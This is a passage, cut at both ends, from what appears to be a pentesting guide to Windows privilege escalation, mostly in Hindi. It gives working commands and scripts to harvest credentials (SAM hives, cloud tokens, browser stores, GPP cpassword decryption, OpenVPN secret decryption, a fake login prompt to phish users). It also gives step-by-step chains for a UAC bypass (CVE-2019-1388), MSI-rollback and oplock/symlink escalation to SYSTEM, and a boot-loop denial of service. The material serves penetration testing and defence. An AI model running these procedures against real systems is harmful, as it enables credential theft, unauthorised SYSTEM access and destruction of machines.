<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM backups
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** नाम की फ़ाइल खोजें

### Cached GPP Pasword

पहले एक फ़ीचर उपलब्ध था जो Group Policy Preferences (GPP) के माध्यम से मशीनों के एक समूह पर custom local administrator accounts की deployment की अनुमति देता था। हालांकि, इस method में गंभीर security flaws थे। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML files के रूप में stored थे, किसी भी domain user द्वारा access किए जा सकते थे। दूसरा, इन GPPs के अंदर के passwords, जो publicly documented default key का उपयोग करके AES256 से encrypted थे, किसी भी authenticated user द्वारा decrypted किए जा सकते थे। इससे एक गंभीर risk पैदा होता था, क्योंकि इससे users को elevated privileges मिल सकती थीं।

इस risk को कम करने के लिए, एक function विकसित किया गया जो locally cached GPP files को scan करता है जिनमें "cpassword" field खाली नहीं होती। ऐसी file मिलने पर, function password को decrypt करता है और एक custom PowerShell object return करता है। इस object में GPP और file के location से संबंधित details शामिल होती हैं, जो इस security vulnerability की पहचान और remediation में मदद करती हैं।

इन files के लिए `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में search करें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को decrypt करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग करके पासवर्ड प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials के साथ web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN क्रेडेंशियल्स
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### क्रेडेंशियल्स के लिए पूछें

आप हमेशा **यूज़र से उसके क्रेडेंशियल्स** या **किसी दूसरे यूज़र के क्रेडेंशियल्स** भी **माँग** सकते हैं, अगर आपको लगता है कि उसे वे पता हो सकते हैं (ध्यान दें कि क्लाइंट से सीधे **क्रेडेंशियल्स** **माँगना** वास्तव में **जोखिमभरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **क्रेडेंशियल्स वाले संभावित filenames**

Known files जिनमें कुछ समय पहले **passwords** **clear-text** या **Base64** में थे
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
कृपया जिन फाइलों को आप खोजना चाहते हैं, उनकी सूची दें।
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में Credentials

आपको इसमें credentials खोजने के लिए Bin को भी check करना चाहिए

कई programs द्वारा saved **passwords recover** करने के लिए आप use कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry के अंदर

**Credentials वाले अन्य possible registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**registry से openssh keys extract करें।**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

आपको ऐसे dbs चेक करने चाहिए जहाँ **Chrome or Firefox** के passwords stored हों।\
साथ ही browsers का history, bookmarks और favourites भी चेक करें, ताकि शायद वहाँ कुछ **passwords are** stored हों।

Browsers से passwords extract करने के लिए tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system में built एक technology है जो अलग-अलग languages के software components के बीच **intercommunication** की अनुमति देती है। हर COM component **class ID (CLSID)** के जरिए **identified** होता है और हर component एक या अधिक interfaces के जरिए functionality expose करता है, जिन्हें interface IDs (IIDs) से identified किया जाता है।

COM classes और interfaces registry में क्रमशः **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के तहत defined होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** को merge करके बनाई जाती है।

इस registry के CLSIDs के अंदर आपको child registry **InProcServer32** मिल सकती है, जिसमें एक **default value** होती है जो एक **DLL** की ओर point करती है, और एक value होती है जिसका नाम **ThreadingModel** है, जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) या **Neutral** (Thread Neutral) हो सकती है।

![](<../../images/image (729).png>)

बुनियादी तौर पर, अगर आप execute होने वाली किसी भी **DLLs** को **overwrite** कर सकते हैं, तो आप **privileges escalate** कर सकते हैं, अगर वह DLL किसी अलग user द्वारा execute की जाने वाली हो।

Attacker COM Hijacking को persistence mechanism की तरह कैसे use करते हैं, यह जानने के लिए देखें:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी निश्चित filename वाली file खोजना**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रेजिस्ट्री में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### पासवर्ड खोजने वाले टूल

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin मैंने यह plugin बनाया है ताकि victim के अंदर **credentials** खोजने वाले हर metasploit POST module को automatically execute किया जा सके।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस page में mention की गई passwords वाली सभी files को automatically search करता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) system से password extract करने के लिए एक और बेहतरीन tool है।

Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) कई tools के **sessions**, **usernames** और **passwords** को search करता है जो इस data को clear text में save करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, और RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

मान लीजिए कि **SYSTEM के रूप में चल रही एक process एक नया process open करती है** (`OpenProcess()`) **full access** के साथ। वही process **एक नया process भी create करती है** (`CreateProcess()`) **low privileges** के साथ, लेकिन मुख्य process के सभी open handles inherit करते हुए।\
फिर, अगर आपके पास **low privileged process पर full access** है, तो आप `OpenProcess()` से बनाए गए privileged process के **open handle** को grab कर सकते हैं और **shellcode inject** कर सकते हैं।\
[इस vulnerability को कैसे detect और exploit करना है, इसकी अधिक जानकारी के लिए यह example पढ़ें।](leaked-handle-exploitation.md)\
[प्रक्रियाओं और threads के different permission levels के साथ inherit हुए और भी open handlers को test और abuse करने के अधिक complete explanation के लिए यह **दूसरी post** पढ़ें (सिर्फ full access नहीं)](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, process communication और data transfer सक्षम करते हैं।

Windows **Named Pipes** नाम की एक feature प्रदान करता है, जो unrelated processes को data share करने देती है, यहां तक कि अलग networks पर भी। यह client/server architecture जैसा है, जिसमें roles **named pipe server** और **named pipe client** के रूप में defined होते हैं।

जब data किसी **client** द्वारा pipe के through भेजा जाता है, तो pipe set up करने वाला **server** **client की identity** अपना सकता है, बशर्ते उसके पास आवश्यक **SeImpersonate** rights हों। एक **privileged process** की पहचान करना जो ऐसी pipe के through communicate करता है जिसे आप mimic कर सकते हैं, उस process की identity अपनाकर **higher privileges** हासिल करने का अवसर देता है, जब वह आपके स्थापित pipe के साथ interact करता है। ऐसे attack को execute करने के instructions के लिए, उपयोगी guides [**यहां**](named-pipe-client-impersonation.md) और [**यहां**](#from-high-integrity-to-system) मिल सकती हैं।

साथ ही, निम्न tool **burp** जैसे tool के साथ named pipe communication को **intercept** करने देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह tool सभी pipes को list और देख कर privescs ढूंढने देता है** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server mode में Telephony service (TapiSrv) `\\pipe\\tapsrv` (MS-TRP) expose करता है। एक remote authenticated client mailslot-based async event path का abuse करके `ClientAttach` को किसी भी existing file पर, जिसे `NETWORK SERVICE` लिख सकता है, arbitrary **4-byte write** में बदल सकता है, फिर Telephony admin rights हासिल करके service के रूप में arbitrary DLL load कर सकता है। पूरा flow:

- `pszDomainUser` को writable existing path पर set करके `ClientAttach` → service इसे `CreateFileW(..., OPEN_EXISTING)` के माध्यम से open करती है और async event writes के लिए use करती है।
- हर event attacker-controlled `InitContext` को `Initialize` से उस handle पर write करता है। `LRegisterRequestRecipient` (`Req_Func 61`) के साथ line app register करें, `TRequestMakeCall` (`Req_Func 121`) trigger करें, `GetAsyncEvents` (`Req_Func 0`) से fetch करें, फिर deterministic writes दोहराने के लिए unregister/shutdown करें।
- `C:\Windows\TAPI\tsec.ini` में खुद को `[TapiAdministrators]` में जोड़ें, reconnect करें, फिर `TSPI_providerUIIdentify` को `NETWORK SERVICE` के रूप में execute करने के लिए किसी arbitrary DLL path के साथ `GetUIDllName` call करें।

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

**[https://filesec.io/](https://filesec.io/)** page देखें

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links जो `ShellExecuteExW` को forward होते हैं, dangerous URI handlers (`file:`, `ms-appinstaller:` या कोई भी registered scheme) trigger कर सकते हैं और attacker-controlled files को current user के रूप में execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

जब आप एक user के रूप में shell प्राप्त करते हैं, तो हो सकता है कि scheduled tasks या अन्य processes execute हो रहे हों जो **command line पर credentials pass** करते हों। नीचे दिया गया script हर दो seconds में process command lines capture करता है और current state की previous state से तुलना करता है, तथा कोई भी differences output करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## प्रक्रियाओं से पासवर्ड चुराना

## Low Priv User से NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

अगर आपके पास graphical interface तक access है (console या RDP के जरिए) और UAC enabled है, तो Microsoft Windows के कुछ versions में एक unprivileged user से terminal या कोई भी अन्य process, जैसे "NT\AUTHORITY SYSTEM", चलाना संभव है।

इससे privileges को escalate करना और उसी vulnerability के साथ UAC को bypass करना, दोनों एक साथ संभव हो जाता है। इसके अलावा, कुछ भी install करने की जरूरत नहीं होती, और process के दौरान इस्तेमाल किया गया binary signed होता है और Microsoft द्वारा issued होता है।

प्रभावित systems में से कुछ निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability का exploit करने के लिए, निम्नलिखित steps करना आवश्यक है:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium से High Integrity Level / UAC Bypass तक

Integrity Levels के बारे में जानने के लिए यह पढ़ें:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर UAC और UAC bypasses के बारे में जानने के लिए यह पढ़ें:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP तक

इस technique का वर्णन [**इस blog post में**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) किया गया है, और इसका exploit code [**यहाँ उपलब्ध है**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)।

यह attack मूल रूप से Windows Installer के rollback feature का abuse करके uninstall process के दौरान legitimate files को malicious files से replace करने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनाना पड़ता है, जिसका उपयोग `C:\Config.Msi` folder को hijack करने के लिए किया जाएगा। बाद में यही folder Windows Installer द्वारा other MSI packages के uninstall के दौरान rollback files store करने के लिए उपयोग होगा, जहाँ rollback files को modify करके malicious payload डाला जाएगा।

संक्षेप में technique यह है:

1. **Stage 1 – Hijack के लिए तैयारी (`C:\Config.Msi` को empty छोड़ना)**

- Step 1: MSI install करें
- एक `.msi` बनाएं जो एक harmless file (जैसे `dummy.txt`) को writable folder (`TARGETDIR`) में install करे।
- Installer को **"UAC Compliant"** mark करें, ताकि **non-admin user** इसे run कर सके।
- install के बाद file पर एक **handle** open रखें।

- Step 2: Uninstall शुरू करें
- उसी `.msi` को uninstall करें।
- Uninstall process files को `C:\Config.Msi` में move करना और उन्हें `.rbf` files (rollback backups) में rename करना शुरू करता है।
- **GetFinalPathNameByHandle** के साथ open file handle को **poll** करें ताकि पता चले कि file कब `C:\Config.Msi\<random>.rbf` बनती है।

- Step 3: Custom Syncing
- `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल होती है जो:
- `.rbf` लिखे जाने पर signal करती है।
- फिर uninstall जारी रखने से पहले दूसरे event पर **wait** करती है।

- Step 4: `.rbf` की deletion block करें
- signal मिलने पर, `.rbf` file को `FILE_SHARE_DELETE` के बिना **open** करें — इससे इसे delete करना **prevent** हो जाता है।
- फिर वापस **signal** करें ताकि uninstall finish हो सके।
- Windows Installer `.rbf` को delete करने में fail करता है, और क्योंकि वह सभी contents delete नहीं कर सकता, **`C:\Config.Msi` remove नहीं होता**।

- Step 5: `.rbf` को manually delete करें
- आप (attacker) `.rbf` file को manually delete करते हैं।
- अब **`C:\Config.Msi` empty** है, hijack के लिए ready।

> इस point पर, **SYSTEM-level arbitrary folder delete vulnerability** trigger करें ताकि `C:\Config.Msi` delete हो जाए।

2. **Stage 2 – Rollback Scripts को Malicious Scripts से replace करना**

- Step 6: कमजोर ACLs के साथ `C:\Config.Msi` recreate करें
- `C:\Config.Msi` folder को खुद recreate करें।
- **weak DACLs** set करें (जैसे, Everyone:F), और **WRITE_DAC** के साथ एक handle open रखें।

- Step 7: दूसरी install चलाएँ
- `.msi` को फिर से install करें, with:
- `TARGETDIR`: writable location.
- `ERROROUT`: एक variable जो forced failure trigger करता है।
- यह install rollback फिर से trigger करने के लिए use होगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: `.rbs` के लिए monitor करें
- `ReadDirectoryChangesW` का use करके `C:\Config.Msi` को monitor करें जब तक नया `.rbs` दिखाई न दे।
- उसका filename capture करें।

- Step 9: Rollback से पहले sync करें
- `.msi` में एक **custom install action (`SyncBeforeRollback`)** होती है जो:
- `.rbs` बनने पर event signal करती है।
- फिर आगे बढ़ने से पहले **wait** करती है।

- Step 10: Weak ACL फिर से apply करें
- `.rbs created` event मिलने के बाद:
- Windows Installer `C:\Config.Msi` पर **strong ACLs** फिर से apply करता है।
- लेकिन क्योंकि आपके पास अभी भी `WRITE_DAC` वाला handle है, आप **weak ACLs** फिर से apply कर सकते हैं।

> ACLs सिर्फ handle open होने पर enforce होते हैं, इसलिए आप फिर भी folder में write कर सकते हैं।

- Step 11: Fake `.rbs` और `.rbf` drop करें
- `.rbs` file को एक **fake rollback script** से overwrite करें जो Windows को कहे:
- आपकी `.rbf` file (malicious DLL) को एक **privileged location** में restore करे (जैसे, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)।
- अपनी fake `.rbf` drop करें जिसमें एक **malicious SYSTEM-level payload DLL** हो।

- Step 12: Rollback trigger करें
- sync event signal करें ताकि installer resume हो जाए।
- एक **type 19 custom action (`ErrorOut`)** install को जानबूझकर एक ज्ञात point पर fail करने के लिए configure होती है।
- इससे **rollback शुरू** होता है।

- Step 13: SYSTEM आपका DLL install करता है
- Windows Installer:
- आपकी malicious `.rbs` पढ़ता है।
- आपकी `.rbf` DLL को target location में copy करता है।
- अब आपके पास आपका **malicious DLL एक SYSTEM-loaded path में** है।

- Final Step: SYSTEM code execute करें
- एक trusted **auto-elevated binary** चलाएँ (जैसे `osk.exe`) जो उस DLL को load करता है जिसे आपने hijack किया।
- **Boom**: आपका code **SYSTEM** के रूप में execute होता है।


### Arbitrary File Delete/Move/Rename से SYSTEM EoP तक

मुख्य MSI rollback technique (पिछली वाली) यह assume करती है कि आप एक **पूरा folder** delete कर सकते हैं (जैसे, `C:\Config.Msi`)। लेकिन अगर आपकी vulnerability सिर्फ **arbitrary file deletion** की अनुमति देती है तो क्या होगा?

आप **NTFS internals** का exploit कर सकते हैं: हर folder के पास एक hidden alternate data stream होता है called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर का **index metadata** store करती है।

इसलिए, अगर आप किसी फ़ोल्डर की **`::$INDEX_ALLOCATION` stream** delete करते हैं, तो NTFS filesystem से **पूरे फ़ोल्डर** को remove कर देता है।

आप यह standard file deletion APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप एक *file* delete API कॉल कर रहे हों, यह **folder itself** को delete करता है।

### From Folder Contents Delete to SYSTEM EoP
अगर आपका primitive arbitrary files/folders को delete करने नहीं देता, लेकिन यह **attacker-controlled folder के *contents* को delete करने** देता है, तो क्या होगा?

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- The oplock **pauses execution** when a privileged process tries to delete `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process ट्रिगर करें (जैसे, `SilentCleanup`)
- यह process folders (जैसे, `%TEMP%`) को scan करता है और उनकी contents delete करने की कोशिश करता है।
- जब यह `file1.txt` तक पहुँचता है, तो **oplock trigger** होता है और control आपकी callback को hand off हो जाता है।

4. Step 4: oplock callback के अंदर – deletion को redirect करें

- Option A: `file1.txt` को कहीं और move करें
- इससे `folder1` empty हो जाता है बिना oplock को break किए।
- `file1.txt` को सीधे delete न करें — ऐसा करने से oplock prematurely release हो जाएगा।

- Option B: `folder1` को एक **junction** में convert करें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control` में एक **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream को target करता है जो folder metadata store करता है — इसे delete करने पर folder delete हो जाता है।

5. Step 5: Release the oplock
- SYSTEM process continue करता है और `file1.txt` को delete करने की कोशिश करता है।
- लेकिन अब, junction + symlink की वजह से, यह वास्तव में यह delete कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` SYSTEM द्वारा delete कर दिया जाता है।

### Arbitrary Folder Create से Permanent DoS तक

ऐसे primitive का exploit करें जो आपको **SYSTEM/admin के रूप में arbitrary folder बनाने** देता है — भले ही **आप files write नहीं कर सकते** या **weak permissions set नहीं कर सकते**।

एक **folder** (file नहीं) बनाएं जिसका नाम किसी **critical Windows driver** का हो, जैसे:
```
C:\Windows\System32\cng.sys
```
- यह path सामान्यतः `cng.sys` kernel-mode driver से संबंधित होता है।
- अगर आप इसे **पहले से folder के रूप में बना दें**, तो Windows boot पर actual driver load करने में fail हो जाता है।
- फिर, Windows boot के दौरान `cng.sys` load करने की कोशिश करता है।
- वह folder को देखता है, **actual driver को resolve करने में fail** होता है, और **crash हो जाता है या boot रोक देता है**।
- यहाँ **कोई fallback नहीं** है, और बाहरी intervention के बिना **कोई recovery नहीं** होती (जैसे boot repair या disk access)।

### Privileged log/backup paths + OM symlinks से arbitrary file overwrite / boot DoS तक

जब कोई **privileged service** एक **writable config** से पढ़े गए path पर logs/exports लिखती है, तो उस path को **Object Manager symlinks + NTFS mount points** की मदद से redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (यहाँ तक कि **SeCreateSymbolicLinkPrivilege** के बिना भी)।

**Requirements**
- target path store करने वाला config attacker के लिए writable हो (जैसे, `%ProgramData%\...\.ini`)।
- `\RPC Control` पर एक mount point और एक OM file symlink बनाने की क्षमता हो (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।
- एक privileged operation हो जो उस path पर लिखती हो (log, export, report)।

**Example chain**
1. config पढ़कर privileged log destination recover करें, जैसे `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`।
2. admin के बिना path redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. privileged component के log लिखने का इंतज़ार करें (जैसे, admin "send test SMS" ट्रिगर करता है)। अब write `C:\Windows\System32\cng.sys` में land होती है।
4. overwritten target (hex/PE parser) inspect करें ताकि corruption confirm हो सके; reboot Windows को tampered driver path load करने के लिए force करता है → **boot loop DoS**. यह किसी भी protected file पर भी लागू होता है जिसे privileged service write के लिए खोलेगा।

> `cng.sys` आम तौर पर `C:\Windows\System32\drivers\cng.sys` से loaded होता है, लेकिन अगर `C:\Windows\System32\cng.sys` में एक copy मौजूद है तो उसे पहले attempt किया जा सकता है, जिससे यह corrupt data के लिए एक reliable DoS sink बन जाता है।



## **High Integrity से System तक**

### **New service**

अगर आप पहले से ही High Integrity process पर चल रहे हैं, तो **SYSTEM तक का path** सिर्फ **एक नया service create और execute** करके आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> When creating a service binary make sure it's a valid service or that the binary performs the necessary actions to fast as it'll be killed in 20s if it's not a valid service.

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

